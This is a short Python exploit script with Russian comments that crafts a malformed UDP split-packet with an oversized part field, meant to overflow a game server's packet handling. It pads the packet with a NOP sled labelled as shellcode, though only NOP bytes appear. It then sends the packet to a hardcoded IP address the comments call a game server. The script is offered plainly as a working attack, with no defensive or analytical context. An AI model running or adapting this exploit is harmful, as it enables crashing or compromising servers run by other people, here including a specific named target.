import socket
import struct

def exploit_server(server_ip, server_port=27016):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Создаем malicious пакет
    packet = struct.pack('<I', 0xFFFFFFFE)  # netsplit signature
    packet += struct.pack('<I', 1)          # id
    packet += struct.pack('<I', 1000)       # length
    packet += struct.pack('<I', 65536)      # part (вызовет overflow)
    packet += struct.pack('<B', 1)          # count  
    packet += struct.pack('<B', 0)          # index
    packet += b'\x90' * 100                 # NOP sled + shellcode
    
    # Отправляем на сервер
    sock.sendto(packet, (server_ip, server_port))
    print(f"Exploit sent to {server_ip}:{server_port}")

# Использование
exploit_server("151.241.228.200")  # IP игрового сервера
